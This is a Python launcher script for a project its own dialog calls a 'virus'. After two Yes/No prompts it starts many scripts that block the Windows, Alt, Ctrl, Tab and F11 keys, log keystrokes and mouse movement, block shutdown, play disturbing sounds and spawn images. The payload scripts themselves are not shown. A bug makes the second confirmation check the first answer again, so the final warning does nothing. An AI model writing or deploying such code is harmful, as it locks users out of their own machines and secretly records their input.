import tkinter as tk
import ctypes
import subprocess


MB_YESNO = 4
ICON_QUESTION = 32

def show_message_box(message, title):
    return ctypes.windll.user32.MessageBoxW(0, message, title, MB_YESNO | ICON_QUESTION)

def main():
    root = tk.Tk()
    root.withdraw() 


    result = show_message_box("Are you sure you want to activate the program?", "Activation Prompt")

    if result == 6:  
        confirmation = show_message_box("Are you really sure you want to open this virus? I am not liable for anything!", "Final Conformation")

        if result == 6:
            subprocess.Popen(["python", "src/main.py"])
            subprocess.Popen(["python", "src/create_files.py"])
            subprocess.Popen(["python", "src/login_config.py"])
            subprocess.Popen(["python", "src/key_blocker/windowskey_block.py"])
            subprocess.Popen(["python", "src/key_blocker/alt_block.py"])
            subprocess.Popen(["python", "src/key_blocker/ctrl_strg_block.py"])
            subprocess.Popen(["python", "src/key_blocker/numpad_block.py"])
            subprocess.Popen(["python", "src/key_blocker/f11_block.py"])
            subprocess.Popen(["python", "src/key_blocker/tab_block.py"])
            subprocess.Popen(["python", "src/logger/key_logger.py"])
            subprocess.Popen(["python", "src/logger/mouse_logger.py"])
            subprocess.Popen(["python", "src/sounds/bad_connection.py"])
            subprocess.Popen(["python", "src/sounds/beep.py"])
            subprocess.Popen(["python", "src/sounds/idk.py"])
            subprocess.Popen(["python", "src/sounds/coded_screaming.py"])
            subprocess.Popen(["python", "src/sounds/chaotic_sound.py"])
            subprocess.Popen(["python", "src/sounds/creepy_sound.py"])
            subprocess.Popen(["python", "src/shutdown/block_shutdown.py"])
            subprocess.Popen(["python", "src/pics_spawner_idk/random_pics.py"])
        root.destroy()  


if __name__ == "__main__":
    main()
